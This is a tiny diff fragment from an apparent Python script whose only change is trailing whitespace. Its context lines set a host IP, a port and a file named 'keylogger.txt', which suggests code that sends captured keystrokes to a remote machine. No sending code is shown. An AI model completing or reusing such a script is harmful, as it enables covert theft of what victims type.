@@ -7,7 +7,7 @@ def read_data_from_file(file_path):
 
 def main():
     host = '172.16.120.1'
-    port = 12345  
+    port = 12345 
 
     file_path = 'keylogger.txt'  
 
